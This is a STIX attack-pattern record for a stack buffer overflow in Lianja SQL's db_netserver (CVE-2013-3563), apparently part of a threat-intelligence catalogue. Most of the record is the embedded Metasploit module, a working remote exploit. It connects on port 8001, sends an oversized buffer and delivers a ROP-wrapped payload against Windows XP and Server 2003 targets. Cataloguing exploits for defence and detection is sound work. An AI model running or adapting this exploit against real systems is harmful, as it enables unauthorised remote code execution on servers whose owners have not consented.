{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e461f332-4576-405c-a190-523c9bb1790b",
    "created": "2024-08-14T16:46:55.327352Z",
    "modified": "2024-08-14T16:46:55.327356Z",
    "name": "Lianja SQL 1.0.0RC5.1 db_netserver Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the db_netserver process, which is spawned by the Lianja SQL server.  The issue is fixed in Lianja SQL 1.0.0RC5.2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/lianja_db_net.rb",
            "external_id": "lianja_db_net.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3563"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::RopDb\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Lianja SQL 1.0.0RC5.1 db_netserver Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the db_netserver process, which\n        is spawned by the Lianja SQL server.  The issue is fixed in Lianja SQL 1.0.0RC5.2.\n      },\n      'Author'         => 'Spencer McIntyre',\n      'License'        => MSF_LICENSE,\n      'References'     => [\n        [ 'CVE', '2013-3563' ],\n        [ 'OSVDB', '93759' ]\n      ],\n      'DefaultOptions' =>\n        {\n          'WfsDelay' => 20\n        },\n      'Platform'       => 'win',\n      'Arch'           => ARCH_X86,\n      'Payload'        =>\n        {\n          'StackAdjustment' => -3500,\n          'Space'           => 500,\n          'BadChars'        => \"\\x01\"\n        },\n      'Targets'        =>\n        [\n          [ 'Lianja SQL 1.0.0RC5.1 / Windows Server 2003 SP1-SP2', { 'rop_target' => '2003' } ],\n          [ 'Lianja SQL 1.0.0RC5.1 / Windows XP SP3', { 'rop_target' => 'xp' } ],\n        ],\n      'DefaultTarget'  => 0,\n      'Privileged'     => true,\n      'DisclosureDate' => '2013-05-22',\n      'Notes'          =>\n        {\n          'Stability'  => [ CRASH_SERVICE_RESTARTS ],\n        },\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8001),\n      ])\n  end\n\n  def check\n    begin\n      connect\n    rescue\n      vprint_error(\"Unable to connect\")\n      return Exploit::CheckCode::Unknown\n    end\n    sock.put(\"db_net\")\n    if sock.recv(4) =~ /\\d{1,5}/\n      return Exploit::CheckCode::Detected\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n    sock.put(\"db_net\")\n    sock.recv(4)\n\n    print_status(\"#{rhost}:#{rport} - Sending Malicious Data\")\n    evil_data =  '000052E1'\n    evil_data << 'A'\n    evil_data << ('0' * 19991) # this can't be randomized, else a Read Access Violation will occur\n    evil_data << generate_rop_payload('msvcrt', payload.encoded, {'target' => target['rop_target']})\n    sock.put(evil_data)\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-05-22",
    "x_mitre_platforms": [
        "win'"
    ]
}